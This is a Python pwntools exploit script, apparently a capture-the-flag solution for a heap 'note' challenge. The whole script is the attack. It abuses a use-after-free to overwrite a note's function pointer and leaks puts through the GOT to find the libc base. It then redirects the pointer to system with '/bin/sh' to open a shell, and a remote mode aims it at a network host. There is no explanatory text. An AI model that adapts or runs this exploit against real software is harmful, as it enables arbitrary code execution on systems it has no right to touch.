from pwn import *

context.log_level = 'debug'
context.arch = 'i386'

local = 1

if local:
	p = process('./note')
	elf = ELF('./note')
	libc = ELF('/home/assassinq/Desktop/pwn/heap/AHB-note/libc-2.23.so')
else:
	p = remote('101.71.29.5', 10001)
	elf = ELF('./note')
	libc = ELF('/home/assassinq/Desktop/pwn/heap/AHB-note/libc-2.23.so')

def d(a=''):
	gdb.attach(p, a)
	if a == '':
		raw_input()

def add(size, con):
	p.sendline('1')
	p.recvuntil('Note size :')
	p.send(str(size))
	p.recvuntil('Content :')
	p.send(con)

def dele(idx):
	p.sendline('2')
	p.recvuntil("Index :")
	p.send(str(idx))

def show(idx):
	p.send('3')
	p.recvuntil("Index :")
	p.send(str(idx))

add(0x20, 'A')
add(0x20, 'B')
add(0x20, 'C')

dele(1)
dele(0)

# d('b *0x08048691\nc')

add(0x8, p32(0x804865B) + p32(elf.got['puts']))

show(1)

p.recvuntil("content :")
leak = p.recv(4)

libc.address = u32(leak) - libc.symbols['puts']
log.info("libc_base:0x%x" % libc.address)

dele(3)

add(0x8, p32(libc.symbols['system']) + p32(libc.search('/bin/sh').next()))

show(1)

p.interactive()
